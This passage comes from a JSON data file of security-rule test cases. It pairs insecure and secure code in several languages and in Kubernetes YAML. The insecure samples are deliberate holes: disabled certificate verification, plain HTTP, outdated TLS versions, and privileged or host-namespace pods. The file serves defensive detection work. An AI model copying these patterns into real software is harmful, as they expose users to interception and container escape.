    "code": "func ok1() {\n    // ok: http-request\n    resp, err := http.Get(\"https://example.com/\")\n    // ok: http-request\n    resp, err := http.Post(\"https://example.com/\", val, val)\n    // ok: http-request\n    resp, err := http.Head(\"https://example.com/\")\n    // ok: http-request\n    resp, err := http.PostForm(\"https://example.com/\", form)\n    // ok: http-request - localhost is acceptable\n    resp, err := http.PostForm(\"http://127.0.0.1/\", form)\n    // ok: http-request\n    resp, err := http.Head(\"http://localhost/path/to/x\")\n}",
    "language": "go",
    "description": "HTTPS requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "package main\n\nimport (\n    \"crypto/tls\"\n    \"net/http\"\n)\n\nfunc bad1() {\n    client := &http.Client{\n        Transport: &http.Transport{\n            // ruleid: bypass-tls-verification\n            TLSClientConfig: &tls.Config{\n                InsecureSkipVerify: true,\n            },\n        },\n    }\n}\n\nfunc bad2() {\n    tr := &http.Transport{\n        // ruleid: bypass-tls-verification\n        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n    }\n    client := &http.Client{Transport: tr}\n}\n\nfunc bad3() {\n    // ruleid: bypass-tls-verification\n    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}\n}\n\nfunc bad4() {\n    // ruleid: bypass-tls-verification\n    mTLSConfig := &tls.Config {}\n    mTLSConfig.PreferServerCipherSuites = true\n    mTLSConfig.InsecureSkipVerify = true\n}",
    "language": "go",
    "description": "disabled TLS verification"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "func ok1() {\n    client := &http.Client{\n        Transport: &http.Transport{\n            // ok: bypass-tls-verification\n            TLSClientConfig: &tls.Config{\n                InsecureSkipVerify: false,\n            },\n        },\n    }\n}\n\nfunc ok2() {\n    tr := &http.Transport{\n        // ok: bypass-tls-verification\n        TLSClientConfig: &tls.Config{InsecureSkipVerify: false},\n    }\n    client := &http.Client{Transport: tr}\n}",
    "language": "go",
    "description": "TLS verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "func bad1() {\n    client := &http.Client{\n        Transport: &http.Transport{\n            // ruleid: disallow-old-tls-versions\n            TLSClientConfig: &tls.Config{\n                MinVersion: tls.VersionSSL30,\n            },\n        },\n    }\n}\n\nfunc bad2() {\n    // ruleid: disallow-old-tls-versions\n    mTLSConfig := &tls.Config {}\n    mTLSConfig.MinVersion = tls.VersionTLS11\n}",
    "language": "go",
    "description": "weak TLS versions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "func ok1() {\n    client := &http.Client{\n        Transport: &http.Transport{\n            // ok: disallow-old-tls-versions\n            TLSClientConfig: &tls.Config{\n                MinVersion: tls.VersionTLS12,\n            },\n        },\n    }\n}\n\nfunc ok2() {\n    // ok: disallow-old-tls-versions\n    mTLSConfig := &tls.Config {}\n    mTLSConfig.MinVersion = tls.VersionTLS13\n}",
    "language": "go",
    "description": "modern TLS versions only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc main() {\n    http.HandleFunc(\"/index\", Handler)\n    // ruleid: use-tls\n    http.ListenAndServe(\":80\", nil)\n}",
    "language": "go",
    "description": "HTTP server without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "func main() {\n    http.HandleFunc(\"/index\", Handler)\n    // ok: use-tls\n    http.ListenAndServeTLS(\":443\", \"cert.pem\", \"key.pem\", nil)\n}",
    "language": "go",
    "description": "HTTPS server with TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "package insecuregrpc\n\nimport (\n    \"google.golang.org/grpc\"\n)\n\nfunc unsafe() {\n    // ruleid: grpc-client-insecure-connection\n    conn, err := grpc.Dial(address, grpc.WithInsecure())\n    if err != nil {\n        log.Fatalf(\"did not connect: %v\", err)\n    }\n    defer conn.Close()\n}",
    "language": "go",
    "description": "insecure gRPC connection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "func safe() {\n    // ok: grpc-client-insecure-connection\n    conn, err := grpc.Dial(address, grpc.WithTransportCredentials(credentials.NewTLS(tlsConfig)))\n    if err != nil {\n        log.Fatalf(\"did not connect: %v\", err)\n    }\n    defer conn.Close()\n}",
    "language": "go",
    "description": "secure gRPC connection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "import requests\n\ndef test1():\n    # ruleid: request-with-http\n    requests.get(\"http://example.com\")\n\ndef test2():\n    url = \"http://example.com\"\n    # ruleid: request-with-http\n    requests.post(url)\n\ndef test3(url = \"http://example.com\"):\n    # ruleid: request-with-http\n    requests.delete(url)\n\ndef test4(url = \"http://example.com\"):\n    # ruleid: request-with-http\n    requests.request(\"HEAD\", url, timeout=30)",
    "language": "python",
    "description": "HTTP requests without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "import requests\n\ndef test1_ok():\n    # ok: request-with-http\n    requests.get(\"https://example.com\")\n\ndef test2_ok():\n    # ok: request-with-http\n    url = \"https://example.com\"\n    requests.post(url)\n\ndef test_localhost_ok(url = \"http://localhost/blah\"):\n    # ok: request-with-http - localhost is acceptable\n    requests.Request(\"HEAD\", url, timeout=30)",
    "language": "python",
    "description": "HTTPS requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "import requests as req\nimport requests\n\nsome_url = \"https://example.com\"\n\n# ruleid: disabled-cert-validation\nr = req.get(some_url, stream=True, verify=False)\n# ruleid: disabled-cert-validation\nr = requests.post(some_url, stream=True, verify=False)\n# ruleid: disabled-cert-validation\nr = requests.post(some_url, verify=False, stream=True)",
    "language": "python",
    "description": "disabled certificate verification"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "import requests as req\nimport requests\n\nsome_url = \"https://example.com\"\n\n# ok: disabled-cert-validation\nr = req.get(some_url, stream=True)\n# ok: disabled-cert-validation\nr = requests.post(some_url, stream=True)",
    "language": "python",
    "description": "certificate verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "import ssl\nimport httplib.client\n\n# ruleid: unverified-ssl-context\ncontext = ssl._create_unverified_context()\nconn = httplib.client.HTTPSConnection(\"123.123.21.21\", context=context)\n\n# ruleid: unverified-ssl-context\nconn = httplib.client.HTTPSConnection(\"123.123.21.21\", context=ssl._create_unverified_context())\n\n# ruleid: unverified-ssl-context\nssl._create_default_https_context = ssl._create_unverified_context\nurllib2.urlopen(\"https://google.com\").read()",
    "language": "python",
    "description": "unverified SSL context"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "import ssl\nimport httplib.client\n\n# ok: unverified-ssl-context\ncontext = ssl.create_default_context()\nconn = httplib.client.HTTPSConnection(\"123.123.21.21\", context=context)",
    "language": "python",
    "description": "verified SSL context"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "class Bad {\n    public void sendbad1() {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n            // ruleid: httpclient-http-request\n            .uri(URI.create(\"http://openjdk.java.net/\"))\n            .build();\n\n        client.sendAsync(request, BodyHandlers.ofString())\n            .thenApply(HttpResponse::body)\n            .thenAccept(System.out::println)\n            .join();\n    }\n\n    public void sendbad2() {\n        String uri = \"http://openjdk.java.net/\";\n        HttpClient client = HttpClient.newBuilder().build();\n        HttpRequest request = HttpRequest.newBuilder()\n                // ruleid: httpclient-http-request\n                .uri(URI.create(uri))\n                .POST(BodyPublishers.ofString(data))\n                .build();\n\n        HttpResponse<?> response = client.send(request, BodyHandlers.discarding());\n    }\n}",
    "language": "java",
    "description": "HTTP requests without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "class Ok {\n    public void sendok1() {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n            // ok: httpclient-http-request\n            .uri(URI.create(\"https://openjdk.java.net/\"))\n            .build();\n\n        client.sendAsync(request, BodyHandlers.ofString())\n            .thenApply(HttpResponse::body)\n            .thenAccept(System.out::println)\n            .join();\n    }\n\n    public void sendok2() {\n        String uri = \"https://openjdk.java.net/\";\n        HttpClient client = HttpClient.newBuilder().build();\n        HttpRequest request = HttpRequest.newBuilder()\n                // ok: httpclient-http-request\n                .uri(URI.create(uri))\n                .POST(BodyPublishers.ofString(data))\n                .build();\n\n        HttpResponse<?> response = client.send(request, BodyHandlers.discarding());\n    }\n}",
    "language": "java",
    "description": "HTTPS requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "public class Bad {\n    public void bad_bypass() {\n        // ruleid: bypass-tls-verification\n        new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {  }\n\n            public void checkServerTrusted(X509Certificate[] certs, String authType) {  }\n        }\n    }\n}",
    "language": "java",
    "description": "disabled TLS verification via empty X509TrustManager"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "public class Ok {\n    public void ok_bypass() {\n        // ok: bypass-tls-verification\n        new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) { }\n\n            public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                try {\n                    checkValidity();\n                } catch (Exception e) {\n                    throw new CertificateException(\"Certificate not valid or trusted.\");\n                }\n             }\n        }\n    }\n}",
    "language": "java",
    "description": "proper certificate validation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "class Bad {\n    public void bad_disable_old_tls1() {\n        // ruleid: disallow-old-tls-versions1\n        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(\n                sslContext,\n                new String[] {\"TLSv1\", \"TLSv1.1\", \"TLSv1.2\"},\n                null,\n                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);\n    }\n\n    public void bad_disable_old_tls2() {\n        // ruleid: disallow-old-tls-versions1\n        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(\n                sslContext,\n                new String[] {\"TLSv1\", \"TLSv1.1\", \"SSLv3\"},\n                null,\n                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);\n    }\n}",
    "language": "java",
    "description": "weak TLS versions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "class Ok {\n    public void ok_disable_old_tls1() {\n        // ok: disallow-old-tls-versions1\n        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(\n                sslContext,\n                new String[] {\"TLSv1.2\"},\n                null,\n                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);\n    }\n\n    public void ok_disable_old_tls2() {\n        // ok: disallow-old-tls-versions1\n        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(\n                sslContext,\n                new String[] {\"TLSv1.2\", \"TLSv1.3\"},\n                null,\n                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);\n    }\n}",
    "language": "java",
    "description": "modern TLS versions only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "require 'net/http'\n\ndef bad1\n    # ruleid: net-http-request\n    uri = URI('http://example.com/index.html?count=10')\n    Net::HTTP.get(uri) # => String\nend\n\ndef bad2\n    # ruleid: net-http-request\n    uri = URI('http://www.example.com/search.cgi')\n    res = Net::HTTP.post_form(uri, 'q' => 'ruby', 'max' => '50')\n    puts res.body\nend\n\ndef bad3\n    # ruleid: net-http-request\n    uri = URI('http://example.com/some_path?query=string')\n\n    Net::HTTP.start(uri.host, uri.port) do |http|\n    request = Net::HTTP::Get.new uri\n\n    response = http.request request # Net::HTTPResponse object\n    end\nend",
    "language": "ruby",
    "description": "HTTP requests without TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "require 'net/http'\n\ndef ok1\n    # ok: net-http-request\n    uri = URI('https://example.com/index.html?count=10')\n    Net::HTTP.get(uri) # => String\nend\n\ndef ok2\n    # ok: net-http-request\n    uri = URI('https://www.example.com/search.cgi')\n    res = Net::HTTP.post_form(uri, 'q' => 'ruby', 'max' => '50')\n    puts res.body\nend\n\ndef ok3\n    # ok: net-http-request\n    uri = URI('https://example.com/some_path?query=string')\n\n    Net::HTTP.start(uri.host, uri.port) do |http|\n    request = Net::HTTP::Get.new uri\n\n    response = http.request request # Net::HTTPResponse object\n    end\nend",
    "language": "ruby",
    "description": "HTTPS requests"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "require \"net/https\"\nrequire \"uri\"\n\nuri = URI.parse(\"https://ssl-site.com/\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nhttp.use_ssl = true\n# ruleid: ssl-mode-no-verify\nhttp.verify_mode = OpenSSL::SSL::VERIFY_NONE\n\nrequest = Net::HTTP::Get.new(uri.request_uri)\nresponse = http.request(request)",
    "language": "ruby",
    "description": "disabled SSL verification"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "require \"net/https\"\nrequire \"uri\"\n\nuri = URI.parse(\"https://ssl-site.com/\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nhttp.use_ssl = true\n# ok: ssl-mode-no-verify\nhttp.verify_mode = OpenSSL::SSL::VERIFY_PEER\n\nrequest = Net::HTTP::Get.new(uri.request_uri)\nresponse = http.request(request)",
    "language": "ruby",
    "description": "SSL verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "<?php\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, \"http://www.example.com/\");\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n\n// ruleid: curl-ssl-verifypeer-off\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);",
    "language": "php",
    "description": "disabled SSL verification"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "<?php\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, \"https://www.example.com/\");\ncurl_setopt($ch, CURLOPT_HEADER, 0);\n\n// ok: curl-ssl-verifypeer-off\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);",
    "language": "php",
    "description": "SSL verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "package testcode.crypto\n\nimport java.net.Socket\nimport java.net.ServerSocket\n\npublic class UnencryptedSocket {\n\n    fun plainSocket(): Void {\n        // ruleid: unencrypted-socket\n        val soc: Socket = Socket(\"www.google.com\", 80)\n        doGetRequest(soc)\n    }\n\n    fun otherConstructors(): Void {\n        // ruleid: unencrypted-socket\n        val soc1: Socket = Socket(\"www.google.com\", 80, true)\n        doGetRequest(soc1)\n        val address: ByteArray = byteArrayOfInts(127, 0, 0, 1)\n        // ruleid: unencrypted-socket\n        val soc2: Socket = Socket(\"www.google.com\", 80, InetAddress.getByAddress(address), 13337)\n        doGetRequest(soc2)\n    }\n}\n\npublic class UnencryptedServerSocket {\n\n    fun plainServerSocket(): Void {\n        // ruleid: unencrypted-socket\n        val ssoc: ServerSocket = ServerSocket(1234)\n        ssoc.close()\n    }\n\n    fun otherConstructors(): Void {\n        // ruleid: unencrypted-socket\n        val ssoc1: ServerSocket = ServerSocket()\n        ssoc1.close()\n        // ruleid: unencrypted-socket\n        val ssoc2: ServerSocket = ServerSocket(1234, 10)\n        ssoc2.close()\n    }\n}",
    "language": "kotlin",
    "description": "unencrypted sockets"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "package testcode.crypto\n\nimport javax.net.ssl.SSLServerSocketFactory\nimport javax.net.ssl.SSLSocketFactory\n\npublic class UnencryptedSocket {\n\n    fun sslSocket(): Void {\n        // ok: unencrypted-socket\n        val soc: Socket = SSLSocketFactory.getDefault().createSocket(\"www.google.com\", 443)\n        doGetRequest(soc)\n    }\n}\n\npublic class UnencryptedServerSocket {\n\n    fun sslServerSocket(): Void {\n        // ok: unencrypted-socket\n        val ssoc: ServerSocket = SSLServerSocketFactory.getDefault().createServerSocket(1234)\n        ssoc.close()\n    }\n}",
    "language": "kotlin",
    "description": "SSL sockets"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "use reqwest::header;\n\n// ruleid: reqwest-accept-invalid\nlet client = reqwest::Client::builder()\n    .danger_accept_invalid_hostnames(true)\n    .build();\n\n// ruleid: reqwest-accept-invalid\nlet client = reqwest::Client::builder()\n    .danger_accept_invalid_certs(true)\n    .build();\n\n// ruleid: reqwest-accept-invalid\nlet client = reqwest::Client::builder()\n    .user_agent(\"USER AGENT\")\n    .cookie_store(true)\n    .danger_accept_invalid_hostnames(true)\n    .build();\n\n// ruleid: reqwest-accept-invalid\nlet client = reqwest::Client::builder()\n    .user_agent(\"USER AGENT\")\n    .cookie_store(true)\n    .danger_accept_invalid_certs(true)\n    .build();",
    "language": "rust",
    "description": "accepting invalid certificates"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "use reqwest::header;\n\n// ok: reqwest-accept-invalid\nlet client = reqwest::Client::builder()\n    .user_agent(\"USER AGENT\")\n    .build();",
    "language": "rust",
    "description": "certificate validation enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "bad",
    "code": "using System.IdentityModel.Tokens;\n\nnamespace System.IdentityModel.Samples\n{\n    public class TrustedIssuerNameRegistry : IssuerNameRegistry\n    {\n        public override string GetIssuerName(SecurityToken securityToken)\n        {\n            X509SecurityToken x509Token = securityToken as X509SecurityToken;\n            if (x509Token != null)\n            {\n                // ruleid: X509-subject-name-validation\n                if (String.Equals(x509Token.Certificate.SubjectName.Name, \"CN=localhost\"))\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n\n                // ruleid: X509-subject-name-validation\n                if (x509Token.Certificate.SubjectName.Name == \"CN=localhost\")\n                {\n                    return x509Token.Certificate.SubjectName.Name;\n                }\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "validating certificates by subject name"
  },
  {
    "ruleId": "",
    "ruleTitle": "Use Secure Transport",
    "type": "good",
    "code": "using System.Security.Cryptography.X509Certificates;\n\npublic bool ValidateCertificate(X509Certificate2 certificate)\n{\n    // ok: X509-subject-name-validation\n    // Use X509Certificate2.Verify() method instead of comparing subject names\n    return certificate.Verify();\n}",
    "language": "csharp",
    "description": "use proper certificate validation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: allow-privilege-escalation-no-securitycontext\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - security context missing allowPrivilegeEscalation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: redis\n      image: redis\n      securityContext:\n        # ruleid: allow-privilege-escalation-true\n        allowPrivilegeEscalation: true",
    "language": "yaml",
    "description": "Pod - privilege escalation explicitly enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: postgres\n      image: postgres\n    # ruleid: allow-privilege-escalation\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000",
    "language": "yaml",
    "description": "Pod - security context exists but missing allowPrivilegeEscalation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: allow-privilege-escalation\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        allowPrivilegeEscalation: false",
    "language": "yaml",
    "description": "Pod - privilege escalation explicitly disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\n# ruleid: run-as-non-root\nspec:\n  containers:\n    - name: nginx\n      image: nginx\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: haproxy\n      image: haproxy",
    "language": "yaml",
    "description": "Pod - no security context at pod level and no runAsNonRoot at container level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  securityContext:\n    # ruleid: run-as-non-root-unsafe-value\n    runAsNonRoot: false\n  containers:\n    - name: redis\n      image: redis\n    - name: haproxy\n      image: haproxy",
    "language": "yaml",
    "description": "Pod - runAsNonRoot explicitly set to false at pod level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: redis\n      image: redis\n      securityContext:\n        # ruleid: run-as-non-root-unsafe-value\n        runAsNonRoot: false",
    "language": "yaml",
    "description": "Pod - runAsNonRoot explicitly set to false at container level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  # ruleid: run-as-non-root-security-context-pod-level\n  securityContext:\n    runAsGroup: 3000\n  containers:\n    - name: nginx\n      image: nginx\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: haproxy\n      image: haproxy",
    "language": "yaml",
    "description": "Pod - security context at pod level missing runAsNonRoot"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # this is ok because there is no security context, requires different fix, so different rule\n    # ok: run-as-non-root-container-level\n    - name: nginx\n      image: nginx\n    - name: postgres\n      image: postgres\n      # ruleid: run-as-non-root-container-level\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: haproxy\n      image: haproxy\n      # ok: run-as-non-root-container-level\n      securityContext:\n        runAsNonRoot: true",
    "language": "yaml",
    "description": "Pod - container security context missing runAsNonRoot when other containers have it"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: nginx\n    # ruleid: run-as-non-root-container-level-missing-security-context\n      image: nginx\n    - name: postgres\n      image: postgres\n      # ok: run-as-non-root-container-level-missing-security-context\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: haproxy\n      image: haproxy\n      # ok: run-as-non-root-container-level-missing-security-context\n      securityContext:\n        runAsNonRoot: true",
    "language": "yaml",
    "description": "Pod - container missing security context when other containers have runAsNonRoot"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  # ok: run-as-non-root\n  securityContext:\n    runAsNonRoot: true\n  containers:\n    - name: nginx\n      image: nginx\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    - name: haproxy\n      image: haproxy",
    "language": "yaml",
    "description": "Pod - runAsNonRoot set at pod level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        # ok: run-as-non-root-unsafe-value\n        runAsNonRoot: true",
    "language": "yaml",
    "description": "Pod - runAsNonRoot set at container level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  # ruleid: privileged-container\n  privileged: true\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - privileged mode at pod spec level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: privileged-container\n    - name: nginx\n      image: nginx\n      securityContext:\n        privileged: true",
    "language": "yaml",
    "description": "Pod - privileged mode at container level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: privileged-container\n    - name: redis\n      image: redis\n      securityContext:\n        privileged: false",
    "language": "yaml",
    "description": "Pod - privileged mode disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: privileged-container\n    - name: postgres\n      image: postgres",
    "language": "yaml",
    "description": "Pod - no privileged setting defaults to false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: writable-filesystem-container\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - no readOnlyRootFilesystem setting"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: writable-filesystem-container\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000",
    "language": "yaml",
    "description": "Pod - security context without readOnlyRootFilesystem"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ruleid: writable-filesystem-container\n    - name: redis\n      image: redis\n      securityContext:\n        readOnlyRootFilesystem: false",
    "language": "yaml",
    "description": "Pod - readOnlyRootFilesystem explicitly set to false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: writable-filesystem-container\n    - name: haproxy\n      image: haproxy\n      securityContext:\n        readOnlyRootFilesystem: true",
    "language": "yaml",
    "description": "Pod - read-only root filesystem enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: seccomp-confinement-disabled\n    - name: nginx\n      image: nginx\n    # ok: seccomp-confinement-disabled\n    - name: postgres\n      image: postgres\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 3000\n        fsGroup: 2000\n    # ruleid: seccomp-confinement-disabled\n    - name: redis\n      image: redis\n      securityContext:\n        seccompProfile: unconfined",
    "language": "yaml",
    "description": "Pod - seccomp profile set to unconfined"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    # ok: seccomp-confinement-disabled\n    - name: nginx\n      image: nginx\n      securityContext:\n        runAsNonRoot: true",
    "language": "yaml",
    "description": "Pod - no explicit seccomp disable uses default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: view-pid\nspec:\n  # ruleid: hostpid-pod\n  hostPID: true\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - host PID namespace enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - no hostPID setting defaults to false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: view-pid\nspec:\n  # ruleid: hostnetwork-pod\n  hostNetwork: true\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - host network namespace enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "good",
    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx",
    "language": "yaml",
    "description": "Pod - no hostNetwork setting defaults to false"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Kubernetes Configurations",
    "type": "bad",
